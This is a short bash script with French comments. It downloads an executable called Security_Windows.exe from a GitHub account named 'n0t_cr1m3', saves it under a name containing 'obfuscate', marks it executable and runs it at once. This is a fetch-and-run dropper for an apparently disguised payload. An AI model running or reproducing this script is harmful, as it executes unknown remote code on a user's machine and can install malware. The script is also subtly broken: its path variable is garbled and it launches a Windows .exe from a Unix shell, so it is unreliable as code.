
lien="https://github.com/n0t_cr1m3/test/blob/main/Security_Windows.exe"

# Emplacement local pour enregistrer le fichier
cheminLocal="user_home=~/Security_Windows_obfuscate.exe"

# Télécharge le fichier depuis le lien
wget -O "$cheminLocal" "$lien"

# Vérifie si le téléchargement s'est bien déroulé
if [ $? -eq 0 ]; then
    # Exécute le fichier téléchargé
    chmod +x "$cheminLocal"  # Rend le fichier exécutable
    "$cheminLocal"
else
    echo "Échec du téléchargement."
fi 